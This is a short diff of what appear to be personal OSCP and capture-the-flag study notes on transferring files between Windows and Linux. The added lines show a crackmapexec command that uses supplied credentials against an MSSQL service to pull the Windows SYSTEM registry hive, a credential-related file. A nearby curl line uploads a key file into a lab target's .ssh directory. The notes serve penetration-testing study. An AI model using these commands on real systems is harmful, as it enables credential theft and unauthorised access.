@@ -47,6 +47,9 @@ Transfer File From Windows To Linux via ssh:
         or Download putty's scp - pscp.exe and run preferrably in C:\ root directory :         
         c:\pscp c:\Users\name\Documents\file.txt shaleph@192.168.45.X:/home/shalep/OSCP/path/newname.txt
 
+        OR we also can download files on linux with crackmapexec:
+        crackmapexec mssql 10.10.76.148 -u 'username' -p 'PasswordHere' --get-file "C:\windows.old\windows\system32\SYSTEM" SYSTEM
+
     Upload file with curl:
         curl -L -i -X POST -H "Conetent-Type: multipart/form-data" -F file="@/home/kali/CTF/Offsec/Amaterasu/text.pub.txt" -F filename="/home/alfredo/.ssh/id_rsa.pub" http://192.168.179.249:33414/file-upload
  
